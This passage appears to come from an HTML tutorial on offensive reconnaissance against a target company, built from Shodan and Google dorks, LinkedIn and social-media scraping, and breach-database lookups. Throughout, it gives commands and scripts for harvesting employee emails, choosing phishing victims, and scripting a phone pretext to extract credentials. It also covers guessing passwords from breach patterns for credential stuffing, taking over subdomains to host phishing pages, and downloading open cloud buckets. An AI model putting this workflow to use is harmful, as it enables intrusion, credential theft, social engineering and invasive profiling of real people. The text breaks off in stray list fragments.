# Find on specific port:
shodan search port:3389

# Find with default credentials:
shodan search \"default password\"

# Advanced filters:

# org:      Organization
# net:      IP range (CIDR)
# country:  Country code
# city:     City name
# port:     Port number
# os:       Operating system
# product:  Software name
# version:  Software version
# vuln:     CVE number

# Examples:

# 1. Find all MongoDB databases:
shodan search \"MongoDB Server Information\" port:27017

# Many exposed without authentication!

# 2. Find webcams:
shodan search \"Server: yawcam\" country:US

# Live webcam streams!

# 3. Find industrial control systems:
shodan search \"Siemens\" port:102

# SCADA systems!

# 4. Find Elasticsearch:
shodan search \"elastic indices\" port:9200

# Often contains sensitive data

# 5. Find devices vulnerable to specific CVE:
shodan search vuln:CVE-2021-44228

# All devices vulnerable to Log4Shell!

# 6. Find specific organization:
shodan search org:\"Target Company\"

# All internet-facing assets!

# 7. Find devices with specific title:
shodan search http.title:\"Dashboard\"

# Finds admin dashboards

# 8. Find FTP servers:
shodan search port:21 \"220\"

# Many allow anonymous access

# Shodan Python API:

import shodan

api = shodan.Shodan('YOUR_API_KEY')

# Search:
results = api.search('apache')

print(f\"Results found: {results['total']}\")

for result in results['matches']:
    print(f\"IP: {result['ip_str']}\")
    print(f\"Port: {result['port']}\")
    print(f\"Organization: {result.get('org', 'N/A')}\")
    print(f\"OS: {result.get('os', 'N/A')}\")
    print(\"-\" * 40)

# Host lookup (detailed info on specific IP):
host = api.host('192.0.2.1')

print(f\"IP: {host['ip_str']}\")
print(f\"Organization: {host.get('org', 'n/a')}\")
print(f\"Operating System: {host.get('os', 'n/a')}\")
print(f\"Ports: {host['ports']}\")

for item in host['data']:
    print(f\"Port: {item['port']}\")
    print(f\"Banner: {item['data']}\")

# Shodan Exploits API:
exploits = api.exploits.search('apache')

for exploit in exploits['matches']:
    print(f\"CVE: {exploit.get('cve', 'N/A')}\")
    print(f\"Description: {exploit['description']}\")

# Monitoring:
# Set up alerts for new assets:

# Web interface:
# Monitors → Create Alert → \"org:Company\"
# Email notification when new IPs appear!

# Shodan Honeyscore:
# Check if IP is honeypot:
score = api.labs.honeyscore('192.0.2.1')
print(f\"Honeypot score: {score}\")  # 0.0 - 1.0 (1.0 = definitely honeypot)

# Common Shodan queries:

# RDP exposed:
port:3389 country:US

# Telnet (often no auth):
port:23

# VNC (often no password):
\"authentication disabled\" port:5900

# Redis (no auth by default):
port:6379 \"redis_version\"

# MySQL:
\"MySQL\" port:3306

# Jenkins (CI/CD servers):
\"X-Jenkins\" \"Set-Cookie: JSESSIONID\"

# Docker API (remote code execution!):
\"Docker\" port:2375

# Kubernetes:
port:10250 ssl:\"kubernetes\"

# Printers:
\"HP LaserJet\" port:9100

# Building automation:
\"Niagara\" port:80</div>

            <h3>Part 5: Advanced Google Dorking</h3>

            <div class="code"># Google Dorking = Using advanced search operators to find hidden info

# Basic operators:

# site:     Limit to specific site
site:company.com

# filetype: Specific file type
filetype:pdf

# intitle:  Words in title
intitle:\"index of\"

# inurl:    Words in URL
inurl:admin

# intext:   Words in body
intext:\"password\"

# cache:    Cached version
cache:company.com

# Combining operators:

# 1. Find exposed directories:
site:company.com intitle:\"index of\" \"parent directory\"

# Shows directory listings!

# 2. Find config files:
site:company.com filetype:env
site:company.com filetype:config
site:company.com filetype:ini

# Often contain database credentials!

# 3. Find database dumps:
site:company.com filetype:sql \"INSERT INTO\"

# 4. Find backup files:
site:company.com (ext:bak | ext:old | ext:backup)

# 5. Find login pages:
site:company.com inurl:login
site:company.com inurl:admin
site:company.com inurl:auth

# 6. Find exposed documents:
site:company.com (filetype:doc | filetype:pdf | filetype:xls)

# Metadata in docs often reveals:
#   - Employee names
#   - Internal paths (C:\\Users\\john\\Documents\\)
#   - Software versions

# 7. Find error messages:
site:company.com intext:\"sql syntax\"
site:company.com intext:\"Warning: mysql\"
site:company.com intext:\"PHP Fatal error\"

# Reveals technology stack!

# 8. Find subdomains:
site:*.company.com

# 9. Find email addresses:
site:company.com intext:\"@company.com\"

# 10. Find exposed API keys:
site:company.com inurl:api (key | token | secret)

# Google Dork Database:
# https://www.exploit-db.com/google-hacking-database

# Examples:

# Exposed .git folders:
inurl:\"/.git\" intitle:\"Index of\"

# AWS S3 buckets:
site:s3.amazonaws.com \"company\"

# Exposed phpMyAdmin:
intitle:\"phpMyAdmin\" inurl:\"index.php\"

# Zoom meeting recordings:
site:zoom.us inurl:rec \"company\"

# Trello boards:
site:trello.com \"company\"

# Google Docs:
site:docs.google.com \"company confidential\"

# Exposed webcams:
inurl:\"/view.shtml\"

# Exposed Jenkins:
intitle:\"Dashboard [Jenkins]\"

# Automation:

import requests
from googlesearch import search

def google_dork(query, num_results=10):
    results = []
    for url in search(query, num_results=num_results):
        results.append(url)
    return results

# Find all PDFs on target:
pdfs = google_dork('site:company.com filetype:pdf', num_results=50)

for pdf in pdfs:
    print(pdf)
    # Download and extract metadata</div>

            <h3>Part 6: LinkedIn Reconnaissance & Social Engineering</h3>

            <div class="code"># LinkedIn = GOLDMINE for corporate recon

# Manual reconnaissance:

# 1. Company employee list:
# Search: "people who work at Company Name"
# Gather:
#   - Names
#   - Job titles
#   - Email patterns (first.last@company.com?)
#   - Technologies mentioned in profiles
#   - Connections (org chart!)

# 2. Technologies used:
# Job postings reveal stack:
#   - "Experience with AWS, Kubernetes, PostgreSQL"
#   - "Python, Django, React"
# Now you know their tech stack!

# 3. Email pattern identification:
# Find 3+ employees with visible emails
# Patterns:
#   - first.last@company.com
#   - flast@company.com
#   - first_last@company.com
# Apply pattern to all employees!

# 4. Target identification:
# Who to phish?
#   - New employees (less security aware)
#   - HR (handle resumes → open attachments)
#   - IT help desk (social engineering prone)
#   - Executives (high-value access)

# Automated LinkedIn OSINT:

# Tool: linkedin2username
git clone https://github.com/initstring/linkedin2username
cd linkedin2username
pip3 install -r requirements.txt

# Generate username list:
python3 linkedin2username.py -c "Company Name"

# Outputs: first.last format usernames
# Use for:
#   - Password spraying
#   - Email list for phishing
#   - Username enumeration

# Email verification:

# Tool: Hunter.io API
import requests

def verify_email(email):
    api_key = "YOUR_API_KEY"
    url = f"https://api.hunter.io/v2/email-verifier?email={email}&api_key={api_key}"
    response = requests.get(url)
    data = response.json()
    return data['data']['status']  # valid, invalid, accept_all

# Verify all generated emails:
with open('usernames.txt', 'r') as f:
    for username in f:
        email = f"{username.strip()}@company.com"
        status = verify_email(email)
        if status == 'valid':
            print(f"[+] {email} is valid!")

# Social engineering pretext building:

# From LinkedIn profile:
# Name: John Doe
# Title: Senior DevOps Engineer
# Company: TechCorp
# Education: MIT (2015)
# Skills: AWS, Docker, Kubernetes

# Phone call pretext:
# "Hi John, this is Mike from AWS Support. We noticed unusual activity
# on your TechCorp account related to your Kubernetes clusters.
# Can you verify your login credentials?"

# → John trusts you because:
#   - You know his name
#   - You know his company
#   - You know they use AWS + Kubernetes
# All from LinkedIn!

# Advanced: Profile scraping

from selenium import webdriver
from selenium.webdriver.common.by import By
import time

driver = webdriver.Chrome()
driver.get('https://www.linkedin.com/login')

# Login (use burner account)
driver.find_element(By.ID, 'username').send_keys('your_email')
driver.find_element(By.ID, 'password').send_keys('your_password')
driver.find_element(By.XPATH, '//button[@type="submit"]').click()

time.sleep(3)

# Search company employees:
driver.get('https://www.linkedin.com/search/results/people/?keywords=Company%20Name')

# Scrape profile links:
profiles = driver.find_elements(By.XPATH, '//a[@data-test-app-aware-link]')

for profile in profiles:
    link = profile.get_attribute('href')
    print(link)
    # Visit each profile, scrape details

driver.quit()

# Compile intelligence report:
# - 100+ employee names
# - Email addresses (verified)
# - Org chart (manager/employee relationships)
# - Tech stack (from job postings + profiles)
# - Physical locations (office addresses)
# - Phone numbers (sometimes in profiles)
# - Personal interests (social engineering hooks)</div>

            <h3>Part 7: Breach Database Intelligence</h3>

            <div class="code"># Breach databases = Password goldmine

# HaveIBeenPwned API:

import requests

def check_breach(email):
    url = f"https://haveibeenpwned.com/api/v3/breachedaccount/{email}"
    headers = {
        'hibp-api-key': 'YOUR_API_KEY',
        'user-agent': 'OSINT Tool'
    }
    response = requests.get(url, headers=headers)
    
    if response.status_code == 200:
        breaches = response.json()
        print(f"[+] {email} found in {len(breaches)} breaches:")
        for breach in breaches:
            print(f"    - {breach['Name']} ({breach['BreachDate']})")
            print(f"      Data types: {', '.join(breach['DataClasses'])}")
    elif response.status_code == 404:
        print(f"[-] {email} not found in breaches")
    else:
        print(f"[!] Error: {response.status_code}")

# Check entire company:
with open('company_emails.txt', 'r') as f:
    for email in f:
        check_breach(email.strip())
        time.sleep(1.5)  # Rate limiting

# Output:
# [+] john.doe@company.com found in 3 breaches:
#     - LinkedIn (2012-05-05)
#       Data types: Email addresses, Passwords
#     - Dropbox (2012-07-01)
#       Data types: Email addresses, Passwords
#     - Adobe (2013-10-04)
#       Data types: Email addresses, Passwords, Usernames

# Now check Dehashed for actual passwords:

# Dehashed.com (paid service, worth it!)
# Search: john.doe@company.com

# Results:
# Email: john.doe@company.com
# Password: Summer2012!
# Source: LinkedIn breach

# Password pattern analysis:
# John's passwords:
#   - Summer2012! (LinkedIn, 2012)
#   - Summer2013! (Dropbox, 2013)
#   - Summer2014! (Adobe, 2014)
# Pattern: Summer[YEAR]!

# Current year: 2024
# Likely password: Summer2024!

# Use for:
#   - Password spraying
#   - Initial access
#   - Credential stuffing

# Automated breach checking:

from h8mail import h8mail_search

def search_breaches(email):
    # h8mail aggregates: HaveIBeenPwned, Snusbase, LeakLookup, etc.
    results = h8mail_search(email)
    
    for result in results:
        print(f"Email: {result['email']}")
        print(f"Password: {result['password']}")
        print(f"Source: {result['source']}")
        print("-" * 40)

# Pastebin monitoring:

import requests
import re

def search_pastebin(company):
    # Use Pastebin scraping API or Google dorks
    query = f"site:pastebin.com {company} password"
    
    # Or direct Pastebin API:
    url = "https://scrape.pastebin.com/api_scraping.php"
    params = {'limit': 100}
    response = requests.get(url, params=params)
    
    pastes = response.json()
    for paste in pastes:
        if company.lower() in paste['body'].lower():
            print(f"[+] Found paste: {paste['key']}")
            print(f"    URL: https://pastebin.com/{paste['key']}")
            
            # Extract credentials:
            credentials = re.findall(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}):(.+)', paste['body'])
            for email, password in credentials:
                print(f"    {email}:{password}")

# GitHub secret scanning:

import requests

def search_github_secrets(company):
    query = f"{company} password OR apikey OR api_key OR token OR secret"
    url = f"https://api.github.com/search/code?q={query}"
    
    headers = {'Authorization': 'token YOUR_GITHUB_TOKEN'}
    response = requests.get(url, headers=headers)
    
    results = response.json()
    for item in results.get('items', []):
        print(f"[+] {item['repository']['full_name']}/{item['path']}")
        print(f"    URL: {item['html_url']}")

# Credential stuffing workflow:
# 1. Collect emails from LinkedIn/theHarvester
# 2. Check HaveIBeenPwned for breaches
# 3. Search Dehashed for plaintext passwords
# 4. Identify password patterns
# 5. Generate likely current passwords
# 6. Test against:
#    - VPN portal
#    - Email (OWA/O365)
#    - SSH
#    - RDP
#    - Custom web apps</div>

            <h3>Part 8: Domain & DNS Intelligence</h3>

            <div class="code"># DNS = Treasure trove of infrastructure info

# WHOIS lookup:
whois company.com

# Output:
# Registrar: GoDaddy
# Creation Date: 2005-03-15
# Expiry Date: 2025-03-15
# Name Servers: ns1.company.com, ns2.company.com
# Registrant: Company Inc.
# Registrant Email: admin@company.com
# Registrant Phone: +1-555-0100

# Intelligence:
# - admin@company.com → Email pattern confirmed
# - +1-555-0100 → Phone for social engineering
# - Expiry date → Domain hijacking opportunity if expired?
# - Nameservers → Internal DNS? Or hosted (Route53, Cloudflare)?

# Historical WHOIS:
# whoishistory.com or DomainTools
# Shows previous owners, registrants
# Useful for domain history, ownership changes

# DNS enumeration:

# A records (IPv4):
dig company.com A

# AAAA records (IPv6):
dig company.com AAAA

# MX records (mail servers):
dig company.com MX

# Output:
# company.com  MX  10 mail1.company.com
# company.com  MX  20 mail2.company.com

# Mail servers identified! → Email infrastructure
# Test for:
#   - Open relay
#   - User enumeration (VRFY, EXPN)
#   - SPF/DMARC misconfiguration

# NS records (nameservers):
dig company.com NS

# TXT records (SPF, DKIM, DMARC, verification):
dig company.com TXT

# Output:
# "v=spf1 include:_spf.google.com ~all"
# → Company uses Google Workspace!

# "google-site-verification=abc123..."
# → Owns this Google verification token

# CAA records (Certificate Authority Authorization):
dig company.com CAA

# Shows which CAs can issue certificates
# If not set → Anyone can issue cert for domain (phishing!)

# Zone transfer attempt:
dig @ns1.company.com company.com AXFR

# If misconfigured, reveals ALL subdomains!
# Usually blocked, but worth trying

# Subdomain enumeration (passive):

# Certificate Transparency logs:
curl "https://crt.sh/?q=%25.company.com&output=json" | jq -r '.[].name_value' | sort -u

# Returns ALL subdomains from SSL certs!
# Example output:
# api.company.com
# dev.company.com
# staging.company.com
# mail.company.com
# vpn.company.com
# admin.company.com

# Subdomain brute force (active):

# Tool: fierce
fierce --domain company.com --subdomains /usr/share/wordlists/subdomains.txt

# Tool: amass
amass enum -active -d company.com -brute -w subdomains.txt

# Tool: subfinder
subfinder -d company.com -all -recursive

# Subdomain takeover check:

# Tool: subjack
git clone https://github.com/haccer/subjack
cd subjack
go build

./subjack -w subdomains.txt -t 100 -timeout 30 -o results.txt

# Checks if subdomain points to:
#   - AWS S3 (but bucket doesn't exist) → Takeover!
#   - GitHub Pages (but repo deleted) → Takeover!
#   - Heroku (but app deleted) → Takeover!
#   - Azure (but resource deleted) → Takeover!

# If takeover possible:
# 1. Create S3 bucket with subdomain name
# 2. Upload phishing page
# 3. Subdomain now serves YOUR content!
# (On legitimate company subdomain!)

# DNS history:

# SecurityTrails.com (free API tier)
import requests

def dns_history(domain):
    api_key = "YOUR_API_KEY"
    url = f"https://api.securitytrails.com/v1/history/{domain}/dns/a"
    headers = {'APIKEY': api_key}
    
    response = requests.get(url, headers=headers)
    data = response.json()
    
    for record in data['records']:
        print(f"Date: {record['last_seen']}")
        print(f"IP: {record['values'][0]['ip']}")
        print("-" * 40)

# Shows all historical IPs for domain
# Useful for:
#   - Finding old, forgotten servers
#   - Tracking infrastructure changes
#   - Identifying hosting providers

# Reverse DNS:

# Find all domains on an IP:
dig -x 192.0.2.10

# Or use SecurityTrails reverse IP search:
url = f"https://api.securitytrails.com/v1/domains/list?ipv4=192.0.2.10"

# Finds:
#   - Virtual hosts on same server
#   - Other company domains
#   - Forgotten domains (potential attack surface)

# ASN enumeration:

# Find company's IP ranges:
whois -h whois.radb.net -- '-i origin AS12345' | grep -Eo "([0-9.]+){4}/[0-9]+"

# Or use bgpview.io:
curl "https://api.bgpview.io/asn/12345/prefixes" | jq -r '.data.ipv4_prefixes[].prefix'

# Output:
# 192.0.2.0/24
# 198.51.100.0/24

# Now scan entire IP ranges:
nmap -sn 192.0.2.0/24
nmap -sS -p- -T4 192.0.2.0/24

# Email server intelligence:

# MX lookup:
dig company.com MX

# Connect to mail server:
telnet mail.company.com 25

# SMTP banner:
220 mail.company.com ESMTP Postfix

# → Running Postfix
# → Check for vulnerabilities

# User enumeration:
VRFY admin@company.com
250 2.1.5 admin@company.com

# → admin@company.com exists!

# SPF/DMARC check:
dig company.com TXT | grep spf
dig _dmarc.company.com TXT

# Weak SPF: "v=spf1 +all"
# → Anyone can spoof emails!

# No DMARC: No _dmarc record
# → Email spoofing possible!</div>

            <h3>Part 9: Social Media Intelligence (SOCMINT)</h3>

            <div class="code"># Social media = Personal information goldmine

# Twitter/X Intelligence:

# Tool: Twint (Twitter scraper, no API needed)
git clone https://github.com/twintproject/twint.git
cd twint
pip3 install . -r requirements.txt

# Search tweets from user:
twint -u target_user

# Search tweets containing keyword:
twint -s "company_name confidential"

# Search tweets near location:
twint -g "40.7128,-74.0060,10km"  # 10km around NYC

# Advanced search:
twint -u target_user --since "2024-01-01" --until "2024-12-31"

# Extract emails/phones from tweets:
twint -u target_user | grep -Eo "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"

# Instagram OSINT:

# Tool: Osintgram
git clone https://github.com/Datalux/Osintgram.git
cd Osintgram
pip3 install -r requirements.txt

# Launch:
python3 main.py target_username

# Commands:
# info → Profile information
# followers → Follower list
# following → Following list
# photos → Download all photos
# comments → Extract comments
# geolocation → Extract geotagged locations

# Geolocation from photos:
# Download photo → Extract EXIF:
exiftool photo.jpg | grep GPS

# Output:
# GPS Latitude: 40.7128
# GPS Longitude: -74.0060
# → New York City!

# Map on Google Maps:
# https://www.google.com/maps?q=40.7128,-74.0060

# Facebook OSINT:

# Graph Search (limited now, but still useful):
# Search: "Photos of [Name]" → All tagged photos
# Search: "Photos liked by [Name]" → Interests
# Search: "Places visited by [Name]" → Locations
# Search: "Friends of [Name]" → Social network

# Automated scraping (use burner account):
from selenium import webdriver

driver = webdriver.Chrome()
driver.get('https://www.facebook.com/login')

# Login with burner account
# Navigate to target profile
# Scrape:
#   - Friends list
#   - Photos
#   - Check-ins (locations)
#   - Workplace
#   - Education
#   - Relationship status

# LinkedIn (covered in Part 6)

# GitHub OSINT:

# User enumeration:
curl "https://api.github.com/users/target_username"

# Output:
# {
#   "name": "John Doe",
#   "email": "john@company.com",
#   "bio": "Senior Developer at TechCorp",
#   "company": "TechCorp",
#   "location": "New York, NY"
# }

# List repositories:
curl "https://api.github.com/users/target_username/repos"

# Search for sensitive info:
# - API keys in code
# - Passwords in commits
# - Internal URLs
# - Employee names (in commit messages)

# Tool: GitHound
git clone https://github.com/tillson/git-hound
cd git-hound
go build

./git-hound --subdomain-file subdomains.txt --dig-files --dig-commits

# Searches for:
# - AWS keys
# - API tokens
# - Database credentials
# - Private keys
# In both code and commit history!

# Reddit OSINT:

# Search: "company_name"
# Sort by: Relevant, New, Top
# Look for:
#   - Employee complaints
#   - Security discussions
#   - Leaked information
#   - Technical details

# Tool: Pushshift Reddit API
import requests

def search_reddit(keyword):
    url = f"https://api.pushshift.io/reddit/search/comment/?q={keyword}&size=100"
    response = requests.get(url)
    data = response.json()
    
    for comment in data['data']:
        print(f"Author: {comment['author']}")
        print(f"Subreddit: {comment['subreddit']}")
        print(f"Comment: {comment['body'][:200]}")
        print(f"URL: https://reddit.com{comment['permalink']}")
        print("-" * 40)

# YouTube OSINT:

# Company channel → Video metadata:
#   - Upload dates (activity timeline)
#   - Employee names (in credits)
#   - Office tour videos (physical layout!)
#   - Product demos (technology stack)

# Employee personal channels:
#   - Location (in about section)
#   - Interests (for social engineering)
#   - Family info
#   - Personal email (in channel contact)

# Discord/Slack OSINT:

# Join public servers
# Search for employees
# Monitor conversations for:
#   - Technical discussions
#   - Security practices
#   - Internal tools mentioned
#   - Complaints about security</div>

            <h3>Part 10: OSINT Automation & Frameworks</h3>

            <div class="code"># Spiderfoot = Automated OSINT powerhouse

# Install:
git clone https://github.com/smicallef/spiderfoot.git
cd spiderfoot
pip3 install -r requirements.txt

# Run:
python3 sf.py -l 127.0.0.1:5001

# Web UI: http://127.0.0.1:5001

# Create new scan:
# Target: company.com
# Modules: Select all (or specific categories)
# Run scan!

# What Spiderfoot does automatically:
# 1. WHOIS lookup
# 2. DNS enumeration
# 3. Subdomain discovery
# 4. Email harvesting
# 5. Social media profiles
# 6. Shodan/Censys lookups
# 7. Breach database checks
# 8. Certificate transparency
# 9. IP geolocation
# 10. Port scanning
# 11. Web crawling
# 12. Dark web monitoring
# And 100+ more modules!

# CLI mode:
python3 sf.py -s company.com -m all -o json

# Photon = Web OSINT crawler

# Install:
git clone https://github.com/s0md3v/Photon.git
cd Photon
pip3 install -r requirements.txt

# Crawl website:
python3 photon.py -u https://company.com

# Output folders:
# - robots.txt
# - sitemap.xml
# - External links
# - Internal links
# - JavaScript files
# - CSS files
# - Images
# - Documents (PDF, DOC, etc.)

# Extract data:
python3 photon.py -u https://company.com --extract all

# Extracts:
# - Emails
# - Phone numbers
# - Social media links
# - AWS keys
# - IP addresses
# - URLs

# Phone number OSINT:

# Tool: PhoneInfoga
git clone https://github.com/sundowndev/PhoneInfoga
cd PhoneInfoga
go build

./phoneinfoga scan -n "+1-555-0100"

# Output:
# Country: United States
# Carrier: Verizon
# Type: Mobile
# Valid: Yes
# Possible locations: New York, NY

# Also searches:
# - Google (for number mentions)
# - Social media (linked accounts)
# - Truecaller
# - Leaked databases

# Email OSINT:

# Tool: Holehe
pip3 install holehe

# Check where email is registered:
holehe email@company.com

# Output:
# [+] Twitter: Registered
# [+] Instagram: Registered
# [+] Facebook: Registered
# [+] LinkedIn: Registered
# [-] Spotify: Not registered
# [+] GitHub: Registered

# Username OSINT:

# Tool: Sherlock
git clone https://github.com/sherlock-project/sherlock.git
cd sherlock
pip3 install -r requirements.txt

# Search username across 300+ sites:
python3 sherlock.py johndoe123

# Output:
# [+] GitHub: https://github.com/johndoe123
# [+] Twitter: https://twitter.com/johndoe123
# [+] Instagram: https://instagram.com/johndoe123
# [+] Reddit: https://reddit.com/user/johndoe123
# ... (300+ sites checked)

# Facial recognition OSINT:

# Tool: PimEyes.com
# Upload photo → Finds ALL instances on internet
# Shows:
#   - Social media profiles
#   - News articles
#   - Company websites
#   - Dating profiles
#   - Forums

# Google Reverse Image Search:
# Upload photo → Find similar images + sources

# Yandex (even better than Google for faces):
# yandex.com/images → Upload → More accurate face matching

# Cryptocurrency OSINT:

# Bitcoin address lookup:
# blockchain.com/btc/address/[ADDRESS]

# Shows:
# - Total received
# - Total sent
# - Current balance
# - All transactions
# - Associated addresses

# Tool: Maltego Bitcoin transforms
# Map entire transaction network!

# Dark web monitoring:

# Tool: OnionScan
git clone https://github.com/s-rah/onionscan.git
cd onionscan
go build

./onionscan --verbose company.com

# Scans Tor hidden services for:
# - Leaked data
# - Company mentions
# - Credentials for sale
# - Dark web marketplaces

# OSINT framework websites:

# 1. osintframework.com
# → Categorized list of OSINT tools

# 2. start.me/p/DPYPMz/the-ultimate-osint-collection
# → Bookmarks for OSINT resources

# 3. inteltechniques.com/tools/
# → Michael Bazzell's custom OSINT tools

# 4. bellingcat.com
# → Open source investigations case studies

# 5. tracelabs.org
# → Missing persons OSINT (practice your skills!)

# Complete OSINT automation script:

import subprocess
import json

def full_osint(target):
    results = {}
    
    # 1. theHarvester
    print("[*] Running theHarvester...")
    subprocess.run(['theHarvester', '-d', target, '-b', 'all', '-f', 'harvest'])
    
    # 2. Amass
    print("[*] Running Amass...")
    subprocess.run(['amass', 'enum', '-passive', '-d', target, '-o', 'amass_results.txt'])
    
    # 3. Shodan
    print("[*] Searching Shodan...")
    subprocess.run(['shodan', 'search', f'hostname:{target}', '-O', '-o', 'shodan_results.txt'])
    
    # 4. Subfinder
    print("[*] Running Subfinder...")
    subprocess.run(['subfinder', '-d', target, '-o', 'subdomains.txt'])
    
    # 5. Httpx (check live subdomains)
    print("[*] Checking live hosts...")
    subprocess.run(['httpx', '-l', 'subdomains.txt', '-o', 'live_hosts.txt'])
    
    # 6. Nuclei (vulnerability scan)
    print("[*] Running Nuclei...")
    subprocess.run(['nuclei', '-l', 'live_hosts.txt', '-o', 'vulnerabilities.txt'])
    
    # 7. WhatsMyName (username search)
    print("[*] Searching usernames...")
    subprocess.run(['whatsmyname', '-u', target])
    
    # 8. HaveIBeenPwned check
    print("[*] Checking breach databases...")
    # (API call as shown earlier)
    
    print("[+] OSINT complete! Results saved.")

# Run:
full_osint('company.com')</div>

            <h3>Part 11: Adversary Infrastructure Profiling</h3>

            <div class="code"># Advanced: Map entire company infrastructure

# Step 1: IP range identification

# Method 1: WHOIS ASN lookup
whois -h whois.radb.net -- '-i origin AS12345'

# Method 2: BGP looking glass
# bgp.he.net/AS12345

# Method 3: SecurityTrails API
import requests

def get_company_ips(company_name):
    api_key = "YOUR_API_KEY"
    url = f"https://api.securitytrails.com/v1/company/{company_name}"
    headers = {'APIKEY': api_key}
    
    response = requests.get(url, headers=headers)
    data = response.json()
    
    for cidr in data['records']:
        print(f"IP Range: {cidr}")

# Step 2: Subdomain enumeration (comprehensive)

# Passive sources:
# - Certificate Transparency (crt.sh)
# - VirusTotal
# - SecurityTrails
# - DNSDumpster
# - Shodan
# - Censys

# Active brute force:
# - Fierce
# - Amass
# - Subfinder
# - Gobuster DNS mode

# Combine all results:
cat crtsh.txt virustotal.txt securitytrails.txt > all_subdomains.txt
sort -u all_subdomains.txt > unique_subdomains.txt

# Step 3: Service identification

# Scan all IPs + subdomains:
nmap -sV -p- -iL targets.txt -oA full_scan

# Parse nmap output:
import xml.etree.ElementTree as ET

def parse_nmap_xml(xml_file):
    tree = ET.parse(xml_file)
    root = tree.getroot()
    
    for host in root.findall('host'):
        ip = host.find('address').get('addr')
        
        for port in host.findall('.//port'):
            portid = port.get('portid')
            service = port.find('service')
            
            if service is not None:
                name = service.get('name')
                product = service.get('product', '')
                version = service.get('version', '')
                print(f"{ip}:{portid} → {name} {product} {version}")

# Step 4: Technology identification

# Tool: Wappalyzer (CLI)
npm install -g wappalyzer

# Scan:
wappalyzer https://company.com

# Output:
# WordPress 6.0
# PHP 8.1
# MySQL
# Cloudflare
# Google Analytics
# jQuery 3.6

# Tool: WhatWeb
whatweb -a 3 https://company.com

# Tool: BuiltWith API
import requests

def builtwith_lookup(domain):
    api_key = "YOUR_API_KEY"
    url = f"https://api.builtwith.com/v20/api.json?KEY={api_key}&LOOKUP={domain}"
    response = requests.get(url)
    data = response.json()
    
    for tech in data['Results'][0]['Result']['Paths'][0]['Technologies']:
        print(f"{tech['Name']}: {tech.get('Description', 'N/A')}")

# Step 5: Cloud asset discovery

# AWS:
# - S3 buckets: bucket-name.s3.amazonaws.com
# - CloudFront: d123456.cloudfront.net
# - API Gateway: abc123.execute-api.us-east-1.amazonaws.com
# - Elastic Beanstalk: app-name.us-east-1.elasticbeanstalk.com

# Azure:
# - Blob storage: storage-name.blob.core.windows.net
# - Web apps: app-name.azurewebsites.net
# - Databases: server-name.database.windows.net

# GCP:
# - Cloud Storage: storage.googleapis.com/bucket-name
# - App Engine: project-id.appspot.com
# - Cloud Functions: region-project-id.cloudfunctions.net

# Enumerate S3 buckets:
# Tool: s3scanner
git clone https://github.com/sa7mon/S3Scanner
cd S3Scanner
pip3 install -r requirements.txt

# Create bucket wordlist:
echo "company" > buckets.txt
echo "company-prod" >> buckets.txt
echo "company-dev" >> buckets.txt
echo "company-backup" >> buckets.txt

# Scan:
python3 s3scanner.py -l buckets.txt

# Test bucket permissions:
aws s3 ls s3://company-backup --no-sign-request

# If accessible:
aws s3 sync s3://company-backup . --no-sign-request

# Step 6: GitHub reconnaissance

# Search code for company references:
# GitHub advanced search:
# - company.com in:file
# - @company.com in:file
# - api.company.com in:file

# Tool: GitDorker
git clone https://github.com/obheda12/GitDorker
cd GitDorker
pip3 install -r requirements.txt

python3 GitDorker.py -tf github_token.txt -d dorks.txt -org CompanyName

# Searches for:
# - API keys
# - Passwords
# - AWS credentials
# - Database strings
# - Internal URLs

# Step 7: Certificate analysis

# Tool: certgraph
git clone https://github.com/lanrat/certgraph
cd certgraph
go build

./certgraph -s company.com -depth 5 -save company.json

# Builds graph of certificate relationships
# Discovers:
# - Related domains
# - Infrastructure connections
# - Hidden subdomains
# - Sister companies

# Step 8: Email infrastructure

# MX records:
dig company.com MX

# SPF record:
dig company.com TXT | grep spf

# DMARC:
dig _dmarc.company.com TXT

# DKIM:
dig default._domainkey.company.com TXT

# Email security check:
# Tool: emailrep.io
curl "https://emailrep.io/john@company.com"

# Output:
# - Reputation score
# - Known breaches
# - Associated domains
# - Suspicious activity

# Step 9: Network mapping

# Traceroute to find network path:
traceroute company.com

# TCP traceroute (more reliable):
sudo traceroute -T company.com

# MTR (continuous traceroute):
mtr company.com

# Identify:
# - ISP
# - Hosting provider
# - Geographic routing
# - Network hops
# - Potential bottlenecks

# Step 10: Mobile app analysis

# Android APK:
# Download from Google Play Store
# Tool: apkpure.com or apkmirror.com

# Extract APK:
unzip app.apk

# Decompile:
apktool d app.apk

# Search for:
# - API endpoints (grep -r "http" .)
# - API keys (grep -r "api_key" .)
# - Hardcoded credentials
# - Internal URLs

# iOS IPA:
# Requires jailbroken device or tools like frida

# Dynamic analysis:
# Install app → Intercept traffic with Burp Suite

# Complete infrastructure map:

# After all reconnaissance, you have:
# ✅ IP ranges
# ✅ Subdomains (100+)
# ✅ Open ports + services
# ✅ Technologies used
# ✅ Cloud assets (S3, Azure blobs)
# ✅ Email infrastructure
# ✅ Employee list
# ✅ Breach credentials
# ✅ GitHub repos + secrets
# ✅ Mobile app endpoints
# ✅ Network topology

# Visualize with mind map:
# Tool: MindMeister, XMind, or text-based:

"""
Company Infrastructure Map:
├── Web Assets
│   ├── www.company.com (192.0.2.10) - Nginx 1.21, WordPress 6.0
│   ├── api.company.com (192.0.2.11) - Python/Flask, AWS
│   └── admin.company.com (192.0.2.12) - Laravel, MySQL
├── Mail Servers
│   ├── mail1.company.com (192.0.2.20) - Postfix
│   └── mail2.company.com (192.0.2.21) - Postfix
├── Cloud Assets
│   ├── S3: company-backups (public read!)
│   └── Azure: company-prod.azurewebsites.net
├── Employees
│   ├── john.doe@company.com (LinkedIn, GitHub, Twitter)
│   └── jane.smith@company.com (LinkedIn, breached: LinkedIn2012)
└── Vulnerabilities
    ├── Subdomain takeover: dev.company.com
    ├── Open S3 bucket: company-backups
    └── Exposed admin panel: admin.company.com (no auth!)
                1. <strong>Domain enumeration:</strong> theHarvester, Recon-ng → Find subdomains, emails<br>
                2. <strong>Infrastructure mapping:</strong> Shodan, Maltego → Map IPs, services, technologies<br>
                3. <strong>Employee discovery:</strong> LinkedIn, Hunter.io → Find names, roles, emails<br>
                4. <strong>Credential hunting:</strong> Breach databases, pastes, Google dorking → Find leaked passwords<br>
                5. <strong>Vulnerability identification:</strong> Shodan (CVEs), exposed services, misconfigurations<br>
                6. <strong>Attack surface analysis:</strong> Combine all data → Identify weakest entry points<br><br>
